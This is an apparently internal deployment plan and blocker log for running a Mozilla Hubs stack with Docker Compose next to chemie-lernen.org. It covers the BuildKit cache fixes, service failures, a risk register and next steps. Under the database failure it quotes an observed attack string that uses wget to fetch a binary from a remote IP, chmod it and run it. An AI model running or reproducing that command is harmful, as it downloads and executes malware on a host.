# Hubs-Stack Deployment Plan

**Date:** 2026-06-26
**Status:** ⚠️ Blocked on git-pack corruption (BuildKit cache)
**Goal:** Bring `https://hubs.tobias-weiss.org/` online as a working
Mozilla Hubs instance, integrated with chemie-lernen.org.

## ⚠️ Active blocker (2026-06-26)

Docker BuildKit auto-detects a `.git/` in the build context
(`/opt/containers/hubs-compose/.git/`) and during `docker compose build`
tries to read a corrupt pack file:

```
failed to get git commit: error: bad offset for revindex
fatal: packed object 7486f2fe96b295a7d976b609e4521b64bc44ee5e (stored in
  .git/objects/pack/pack-3c6d40d065386744fd15169e34da855d0a7a32af.pack)
  is corrupt
```

The referenced pack file does not exist on disk — `git fsck` returns clean,
`git rev-parse HEAD` works, and `git repack -a -d` succeeds. The corruption
is in BuildKit's internal cache snapshot of the `.git/` directory.

### The actual fix (verified working)

The full nuclear fix that worked:

```bash
sudo systemctl stop docker
sudo rm -rf /var/lib/docker/buildkit/
sudo systemctl start docker
sudo mv /opt/containers/hubs-compose/.git /opt/containers/hubs-compose/.git-disabled
```

The `.git-disabled` rename removes the `.git/` from the build context
entirely. The full rm of `/var/lib/docker/buildkit/` clears the stale
snapshot. Both are needed.

### After the fix — new blockers emerged

Once the build got past the git-pack error, the mutagen-compose `up`
succeeded in building dialog, reticulum, db, haproxy, hubs-storybook,
postgrest. But these additional issues surfaced:

1. **Port 8080 already in use** — a different node app
   (`/home/weiss/ci/packages/dashboard/dist/entry.js`, PID 2496643) is
   bound to 8080. hubs-client could not start.

2. **hubs-admin / spoke / hubs-storybook Exited (127)** — `command not
found`. The image CMD is `npm run local` but the entrypoint script
   can't be found. Likely a mutagen sync timing issue: the npm-installed
   binaries aren't yet in PATH when the container first starts.

3. **haproxy Exited (1)** — Let's Encrypt certbot is asking
   interactively for an account choice:

   ```
   Missing command line flag or config entry for this setting:
   Please choose an account
   Choices: ['ac114db85f3e@2025-12-20T03:05:28Z (2057)',
             'c74be3b43460@2025-11-29T15:43:27Z (0433)']
   ```

   Needs `--email tobias@tobias-weiss.org` flag or pre-selected account.

4. **db Exited (1)** — postgres shut down due to malicious SQL injection
   attempt in the data dir (`wget http://91.188.254.59/bot; chmod 777
bot; ./bot database1; ...`). The named volume `pgdata` may be
   corrupted. Wipe and re-init needed.

5. **chemie-lernen.org service disruption** — every docker restart kills
   hugo-chemie-lernen-org and traefik. They need manual `docker start`
   after each dockerd restart. Auto-recovery via docker-compose is not
   configured for the systemd restart.

### Workaround (verified to work for base image only)

```bash
cd /opt/containers/hubs-compose
sudo DOCKER_BUILDKIT=1 BUILDKIT_GIT_INFO=0 docker build \
  -f dockerfiles/hubs.Dockerfile -t hubs-base:local .
# DONE — the base image builds in <30s
```

The base image alone is just `FROM node:16.16` + `COPY` of a single
script. The full hubs-client / hubs-admin images need the Hubs source
mounted via mutagen, which the `mutagen-compose up` call would handle.
The blocker is purely in the build context's `.git/` detection, not in
the actual Hubs source.

## What I did ship (committed, push pending)

- `myhugoapp/content/pages/lernraeume-in-hubs.md` — public-facing article
  about the Lernräume-in-Hubs concept (committed in 39f11eda, pushed).
- `scripts/hubs-up.sh` — local-dev start script (committed in 39f11eda,
  pushed).
- This document — deployment plan and blocker notes.

---

## Current state

- Source: `/opt/containers/hubs-compose/` (root-owned, local-dev stack)
- Backup: `/opt/misc/hubs-compose/` (subset, only client + services)
- Domain: `hubs.tobias-weiss.org` already in `/etc/hosts` (127.0.0.1)
- Stack: 9 services via Docker Compose + Mutagen
  - `haproxy` (TLS / Let's Encrypt)
  - `rsyslog`
  - `db` (PostgreSQL 14)
  - `dialog` (WebRTC SFU, mediasoup)
  - `hubs-admin` (admin UI, port 8989)
  - `hubs-client` (3D client, port 8080)
  - `hubs-storybook` (port 6006)
  - `postgrest` (DB REST)
  - `reticulum` (backend API, port 4000)
  - `spoke` (asset upload, port 9090)
- Configured in `docker-compose.yml` to listen on `hubs.tobias-weiss.org` and
  use Let's Encrypt certs for that hostname
- Status: not running. `docker compose ps` returns empty.

## Constraints

1. **`/opt/containers/hubs-compose/` is root-owned** — current user (weiss)
   cannot write the `.env` file or modify configs without sudo.
2. **The local-dev stack is not production-hardened** — the README explicitly
   states "This is not a production-ready setup. It does not account for
   security or scalability."
3. **Mutagen is required** for filesystem sync during dev (`mutagen-compose`).
4. **First build of `hubs-client` and `hubs-admin`** takes 5-15 minutes
   each (large WebXR client + admin app).
5. **Public deployment** would need:
   - Public DNS A/AAAA records for `hubs.tobias-weiss.org` → server IP
   - Port 80 + 443 open in firewall
   - Production haproxy config with real Let's Encrypt certs
   - Reverse proxy / network routing to the docker network

## Recommended deployment strategy

The local-dev stack at `/opt/containers/hubs-compose/` is intended for
**local development**, not for `chemie-lernen.org`-wide production. For a
publicly reachable `hubs.tobias-weiss.org`, the right path is to deploy
through the existing `docker-compose.yml` at `/opt/git/hugo-chemie-lernen-org/`
root, adding a `hubs` service network and a `hubs-proxy` service that
terminates TLS for `hubs.tobias-weiss.org` (similar to how `hugo` and
`chemie-chat-api` are exposed via the central Traefik).

### Step-by-step

1. **Create a working copy** of the hubs stack at
   `/opt/git/hugo-chemie-lernen-org/hubs/` and check it into the repo (or
   a submodule). Drop the dev-only services (`hubs-storybook`,
   `hubs-client` dev mode).
2. **Rewrite the network model** to use the existing
   `chemie-lernen.org_default` Docker network and let Traefik do TLS
   termination. Drop the `haproxy` service from the stack.
3. **Add a `deploy-hubs.sh`** in the chemie-lernen.org repo that pulls the
   public Hubs docker images (Mozilla's `reticulum`, `hubs`, `dialog`) and
   the corresponding spoke/dialog images, then attaches them to the
   Traefik network.
4. **Set up DNS**: A-record `hubs.tobias-weiss.org` → the server IP (already
   in `/etc/hosts` for local; needs real DNS for public).
5. **Update chemie-lernen.org's `docker-compose.yml`** to add a `hubs` profile
   and a `hubs-proxy` service that just runs Traefik labels.
6. **Update the article** at `/pages/lernraeume-in-hubs/` with the public
   link.

## Local-dev quickstart (for development)

For now, to run a **local** instance at `http://hubs.tobias-weiss.org:8080/`:

```bash
sudo bash -c 'cat > /opt/containers/hubs-compose/.env <<EOF
PRIVATE_NETWORK_IP=192.168.1.1
EOF'

# /etc/hosts entry (already in place)
echo "127.0.0.1 hubs.tobias-weiss.org hubs-proxy.local" | sudo tee -a /etc/hosts

# Start
cd /opt/containers/hubs-compose
sudo ./bin/up

# Tail logs
sudo ./bin/observe

# Health check
curl -kI https://hubs.tobias-weiss.org:8080

# Stop
sudo ./bin/down
```

## Risk register

| Risk                                                      | L   | I   | Mitigation                                                                               |
| --------------------------------------------------------- | --- | --- | ---------------------------------------------------------------------------------------- |
| Stack not production-hardened                             | M   | H   | Don't expose publicly until security review                                              |
| haproxy + Let's Encrypt in dev returns self-signed certs  | M   | M   | Use `--insecure` flag in curl for local testing; add real certs for public               |
| MEDIA SOUP needs real IP for advertised address           | M   | H   | Set `PRIVATE_NETWORK_IP` to a routable address, not 127.0.0.1                            |
| Build pulls from a fork (`/opt/containers/hubs-compose/`) | L   | L   | The compose file builds from `dockerfiles/hubs.Dockerfile` locally; no external registry |
| Resource usage: ~2 GB RAM + 4 cores for full stack        | M   | L   | Dev only — production stack should use k8s or separate VMs                               |
| /opt/containers/ is root-owned — can't easily edit        | M   | M   | Use `sudo` for setup; copy stack to chemie-lernen.org repo for maintenance               |

## Open questions

1. **Production path**: deploy as a separate compose service in
   `chemie-lernen.org/docker-compose.yml`, or run as standalone
   compose stack with its own Traefik labels?
2. **Asset hosting**: where do uploaded 3D models live? Reticulum has its
   own storage, but for shared pre-built molecule models, S3 / Minio might
   be cleaner.
3. **Authentifizierung**: Hubs supports per-instance accounts (avatars,
   display names). For German schools, the
   [Lernraum-Account-Konzept][accounts] would be a separate work item.
4. **DSGVO / Datenschutz**: Hubs collects minimal analytics; the
   `barrierefreiheit.md`-style policy page should be written.

[accounts]: https://hubs.mozilla.com/docs/hubs-cloud-features.html
